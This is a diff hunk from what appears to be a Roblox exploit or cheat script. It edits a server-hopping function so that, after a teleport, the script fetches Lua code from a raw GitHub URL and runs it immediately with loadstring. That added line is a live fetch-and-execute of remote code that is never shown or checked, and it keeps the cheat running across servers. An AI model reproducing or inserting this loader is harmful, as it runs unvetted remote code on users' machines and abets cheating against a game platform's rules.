@@ -343,7 +343,7 @@ local function HopToEmptyServer()
         pcall(function()
             queue_to_teleport([[
                 repeat task.wait() until game:IsLoaded()
-                loadstring(game:HttpGet(""))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/doukeyi0102/A/refs/heads/main/a1.lua"))()
             ]])
         end)
     end
